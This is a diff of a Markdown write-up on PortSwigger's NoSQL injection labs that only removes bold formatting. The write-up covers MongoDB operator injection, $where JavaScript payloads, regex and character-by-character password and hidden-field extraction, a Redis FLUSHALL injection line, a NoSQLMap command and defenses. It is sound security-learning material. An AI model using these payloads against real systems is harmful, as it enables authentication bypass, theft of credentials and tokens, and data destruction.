@@ -14,10 +14,10 @@ Completed all 4 NoSQL injection labs from Portswigger. NoSQL injection vulnerabi
 
 NoSQL injection is a vulnerability that allows attackers to manipulate NoSQL database queries by injecting malicious input. Unlike SQL injection, NoSQL databases use various query languages and data structures:
 
-- **MongoDB:** JSON-like documents with JavaScript operators
-- **CouchDB:** JSON queries with MapReduce
-- **Redis:** Key-value commands
-- **Cassandra:** CQL (Cassandra Query Language)
+- MongoDB: JSON-like documents with JavaScript operators
+- CouchDB: JSON queries with MapReduce
+- Redis: Key-value commands
+- Cassandra: CQL (Cassandra Query Language)
 
 Attackers can exploit NoSQL injection to:
 - Bypass authentication
@@ -28,7 +28,7 @@ Attackers can exploit NoSQL injection to:
 
 ##### 2. NoSQL Database Types
 
-**Document Stores (MongoDB, CouchDB):**
+Document Stores (MongoDB, CouchDB):
 ```javascript
 // Normal query
 db.users.find({username: "admin", password: "pass123"})
@@ -38,7 +38,7 @@ db.users.find({username: {"$ne": null}, password: {"$ne": null}})
 // Returns all users
 ```
 
-**Key-Value Stores (Redis):**
+Key-Value Stores (Redis):
 ```
 // Normal
 GET user:1234
@@ -47,13 +47,13 @@ GET user:1234
 GET user:1234\nFLUSHALL
 ```
 
-**Column Stores (Cassandra):**
+Column Stores (Cassandra):
 ```sql
 -- Similar to SQL injection
 SELECT * FROM users WHERE username = 'admin' OR '1'='1'
 ```
 
-**Graph Databases (Neo4j):**
+Graph Databases (Neo4j):
 ```cypher
 // Cypher injection
 MATCH (u:User {username: 'admin'}) OR 1=1//})
@@ -61,7 +61,7 @@ MATCH (u:User {username: 'admin'}) OR 1=1//})
 
 ##### 3. MongoDB Operators & Syntax
 
-**Comparison Operators:**
+Comparison Operators:
 ```javascript
 $eq  // Equal to
 $ne  // Not equal to
@@ -73,7 +73,7 @@ $in  // In array
 $nin // Not in array
 ```
 
-**Logical Operators:**
+Logical Operators:
 ```javascript
 $and // AND condition
 $or  // OR condition
@@ -81,13 +81,13 @@ $not // NOT condition
 $nor // NOR condition
 ```
 
-**Element Operators:**
+Element Operators:
 ```javascript
 $exists // Field exists
 $type   // Field type check
 ```
 
-**Evaluation Operators:**
+Evaluation Operators:
 ```javascript
 $regex  // Regular expression match
 $where  // JavaScript expression
@@ -96,7 +96,7 @@ $expr   // Aggregation expression
 
 ##### 4. Common NoSQL Injection Vectors
 
-**Authentication Bypass:**
+Authentication Bypass:
 ```javascript
 // Original query
 {username: "admin", password: "password123"}
@@ -111,7 +111,7 @@ $expr   // Aggregation expression
 {username: "admin", password: {"$gt": ""}}
 ```
 
-**Tautology Injection:**
+Tautology Injection:
 ```javascript
 // URL parameter
 ?category=Gifts'||'1'=='1
@@ -121,7 +121,7 @@ $expr   // Aggregation expression
 // Always evaluates to true
 ```
 
-**Operator Injection:**
+Operator Injection:
 ```javascript
 // POST body
 {"username": "admin", "password": {"$ne": null}}
@@ -131,7 +131,7 @@ db.users.find({username: "admin", password: {$ne: null}})
 // Matches if password field exists
 ```
 
-**JavaScript Injection:**
+JavaScript Injection:
 ```javascript
 // $where operator allows JavaScript
 {"$where": "this.username == 'admin'"}
@@ -144,7 +144,7 @@ db.users.find({username: "admin", password: {$ne: null}})
 {"$where": "sleep(5000) || true"}
 ```
 
-**Regex Injection:**
+Regex Injection:
 ```javascript
 // Extract data character by character
 {username: "admin", password: {"$regex": "^a.*"}}
@@ -156,7 +156,7 @@ db.users.find({username: "admin", password: {$ne: null}})
 
 ##### 5. Data Extraction Techniques
 
-**Character-by-Character Extraction:**
+Character-by-Character Extraction:
 ```javascript
 // Check each character position
 this.password[0] == 'a'  // First char is 'a'
@@ -170,7 +170,7 @@ this.password[1] == 'b'  // Second char is 'b'
 this.password.length == 8
 ```
 
-**Field Discovery:**
+Field Discovery:
 ```javascript
 // Using $where with JavaScript
 {
@@ -183,7 +183,7 @@ this.password.length == 8
 {fieldname: {"$exists": true}}
 ```
 
-**Boolean-Based Blind Injection:**
+Boolean-Based Blind Injection:
 ```javascript
 // True condition - different response
 ' && this.password[0] == 'p' || 'a'=='b
@@ -192,7 +192,7 @@ this.password.length == 8
 ' && this.password[0] == 'x' || 'a'=='b
 ```
 
-**Time-Based Blind Injection:**
+Time-Based Blind Injection:
 ```javascript
 {
   "$where": "function() {
@@ -204,7 +204,7 @@ this.password.length == 8
 
 ##### 6. Advanced Exploitation
 
-**Extracting Unknown Field Names:**
+Extracting Unknown Field Names:
 ```javascript
 // Get number of fields
 Object.keys(this).length
@@ -220,7 +220,7 @@ Object.keys(this)[3].match('^a.*')  // Starts with 'a'
 Object.keys(this)[3].match('^ab.*') // Starts with 'ab'
 ```
 
-**Conditional Data Access:**
+Conditional Data Access:
 ```javascript
 {
   "$where": "function() {
@@ -232,7 +232,7 @@ Object.keys(this)[3].match('^ab.*') // Starts with 'ab'
 }
 ```
 
-**Aggregate Pipeline Injection:**
+Aggregate Pipeline Injection:
 ```javascript
 // Injection in aggregation
 [
@@ -241,7 +241,7 @@ Object.keys(this)[3].match('^ab.*') // Starts with 'ab'
 ]
 ```
 
-**MapReduce Injection:**
+MapReduce Injection:
 ```javascript
 // In CouchDB map function
 function(doc) {
@@ -253,7 +253,7 @@ function(doc) {
 
 ##### 7. Detection Methods
 
-**Error-Based Detection:**
+Error-Based Detection:
 ```
 # Inject special characters
 ' " \ $ { }
@@ -269,7 +269,7 @@ Syntax error
 Unexpected token
 ```
 
-**Boolean-Based Detection:**
+Boolean-Based Detection:
 ```javascript
 // True condition
 ?user=admin'||'1'=='1
@@ -280,7 +280,7 @@ Unexpected token
 // Compare response differences
 ```
 
-**Time-Based Detection:**
+Time-Based Detection:
 ```javascript
 // Cause intentional delay
 {"$where": "sleep(5000)"}
@@ -290,7 +290,7 @@ Normal: 100ms
 Injected: 5100ms
 ```
 
-**Operator Testing:**
+Operator Testing:
 ```javascript
 // Test various operators
 {"$ne": ""}     // Not equal
@@ -301,46 +301,46 @@ Injected: 5100ms
 
 ##### 8. Real-World Impact
 
-**Authentication Bypass:**
+Authentication Bypass:
 - Login as any user without password
 - Admin panel access
 - Privilege escalation
 
-**Data Exfiltration:**
+Data Exfiltration:
 - Extract passwords character by character
 - Discover hidden fields (reset tokens, API keys)
 - Enumerate users and sensitive data
 
-**Business Logic Abuse:**
+Business Logic Abuse:
 - Modify prices
 - Change user roles
 - Access restricted features
 
-**Code Execution:**
+Code Execution:
 - Server-side JavaScript execution via $where
 - Shell command injection in some configurations
 - Denial of service via resource exhaustion
 
 ##### 9. Famous Vulnerabilities
 
-**MongoDB Ransomware (2017):**
+MongoDB Ransomware (2017):
 - Exposed MongoDB instances
 - NoSQL injection for access
 - Data ransom attacks
 
-**Various Bug Bounties:**
+Various Bug Bounties:
 - Authentication bypass via operator injection
 - Password extraction using regex
 - Hidden field discovery (tokens, keys)
 
-**E-Commerce Sites:**
+E-Commerce Sites:
 - Price manipulation
 - Inventory bypass
 - Discount code abuse
 
 ##### 10. Defense Strategies
 
-**Input Validation:**
+Input Validation:
 ```javascript
 // Whitelist allowed characters
 function sanitize(input) {
@@ -359,7 +359,7 @@ function sanitize(input) {
 }
 ```
 
-**Type Checking:**
+Type Checking:
 ```javascript
 // Ensure inputs are expected types
 function validateLogin(username, password) {
@@ -372,7 +372,7 @@ function validateLogin(username, password) {
 }
 ```
 
-**Use Parameterized Queries:**
+Use Parameterized Queries:
 ```javascript
 // Bad - direct concatenation
 const query = {username: req.body.username};
@@ -384,7 +384,7 @@ const query = {
 };
 ```
 
-**Disable JavaScript Execution:**
+Disable JavaScript Execution:
 ```javascript
 // MongoDB - disable $where and mapReduce
 mongod --noscripting
@@ -396,7 +396,7 @@ mongod --noscripting
 }
 ```
 
-**Least Privilege:**
+Least Privilege:
 ```javascript
 // Database user with minimal permissions
 // Read-only for most operations
@@ -404,7 +404,7 @@ mongod --noscripting
 // No admin commands
 ```
 
-**Schema Validation:**
+Schema Validation:
 ```javascript
 // MongoDB schema validation
 db.createCollection("users", {
@@ -421,7 +421,7 @@ db.createCollection("users", {
 })
 ```
 
-**Use ORM/ODM:**
+Use ORM/ODM:
 ```javascript
 // Mongoose (MongoDB ODM)
 const userSchema = new Schema({
@@ -435,21 +435,21 @@ User.findOne({username, password});
 
 ##### 11. Testing Methodology
 
-**Step-by-Step Approach:**
+Step-by-Step Approach:
 
-1. **Identify NoSQL Usage:**
+1. Identify NoSQL Usage:
    - Check documentation/error messages
    - Look for JSON in requests
    - Test for MongoDB-specific behavior
 
-2. **Test Basic Injection:**
+2. Test Basic Injection:
    ```javascript
    username=admin'
    username[$ne]=
    {"username": {"$ne": ""}}
    ```
 
-3. **Test Operators:**
+3. Test Operators:
    ```javascript
    {"$ne": ""}
    {"$gt": ""}
@@ -457,13 +457,13 @@ User.findOne({username, password});
    {"$where": "1"}
    ```
 
-4. **Boolean Testing:**
+4. Boolean Testing:
    ```
    ' || '1'=='1
    ' && '1'=='2
    ```
 
-5. **Extract Data:**
+5. Extract Data:
    ```javascript
    // Length
    this.password.length == 8
@@ -473,7 +473,7 @@ User.findOne({username, password});
    this.password.match('^a.*')
    ```
 
-6. **Discover Fields:**
+6. Discover Fields:
    ```javascript
    Object.keys(this).length
    Object.keys(this)[0]
@@ -481,19 +481,19 @@ User.findOne({username, password});
 
 ##### 12. Tools & Automation
 
-**Burp Suite:**
+Burp Suite:
 - NoSQL injection scanner extensions
 - Intruder for character extraction
 - Repeater for manual testing
 
-**NoSQLMap:**
+NoSQLMap:
 ```bash
 nosqlmap -u "http://target.com/login" \
   --data "username=admin&password=pass" \
   --method POST
 ```
 
-**Custom Scripts:**
+Custom Scripts:
 ```python
 import requests
 
@@ -515,7 +515,7 @@ def extract_password(url, username):
     return password
 ```
 
-**Automated Testing:**
+Automated Testing:
 - Scan for operator injection
 - Brute force character positions
 - Field name enumeration
@@ -753,13 +753,13 @@ Logging in with the password solves the lab.
 
 These 4 labs demonstrated the unique challenges and techniques of NoSQL injection. Key takeaways include:
 
-- **Different Syntax, Same Impact:** NoSQL injection uses operators and JavaScript instead of SQL keywords, but achieves similar results
-- **Operator Injection Is Powerful:** Simple operators like `$ne`, `$gt`, `$regex` can bypass authentication completely
-- **Character-by-Character Works:** Extracting data one character at a time through boolean conditions remains effective
-- **JavaScript Execution Is Dangerous:** The `$where` operator allowing JavaScript opens up extensive exploitation possibilities
-- **Field Discovery Is Possible:** Using `Object.keys()` in JavaScript contexts allows discovering hidden database fields
-- **Regex Enables Brute Force:** Pattern matching with regex provides a reliable method for data extraction
-- **Type Matters:** JSON structure allows injecting objects where strings are expected
+- Different Syntax, Same Impact: NoSQL injection uses operators and JavaScript instead of SQL keywords, but achieves similar results
+- Operator Injection Is Powerful: Simple operators like `$ne`, `$gt`, `$regex` can bypass authentication completely
+- Character-by-Character Works: Extracting data one character at a time through boolean conditions remains effective
+- JavaScript Execution Is Dangerous: The `$where` operator allowing JavaScript opens up extensive exploitation possibilities
+- Field Discovery Is Possible: Using `Object.keys()` in JavaScript contexts allows discovering hidden database fields
+- Regex Enables Brute Force: Pattern matching with regex provides a reliable method for data extraction
+- Type Matters: JSON structure allows injecting objects where strings are expected
 
 What made these labs particularly challenging was the fourth one—extracting unknown field names using JavaScript execution in MongoDB. The technique of iterating through `Object.keys()` and matching characters with regex to discover a hidden `resetPwdToken` field showed how deeply NoSQL injection can compromise systems.
 
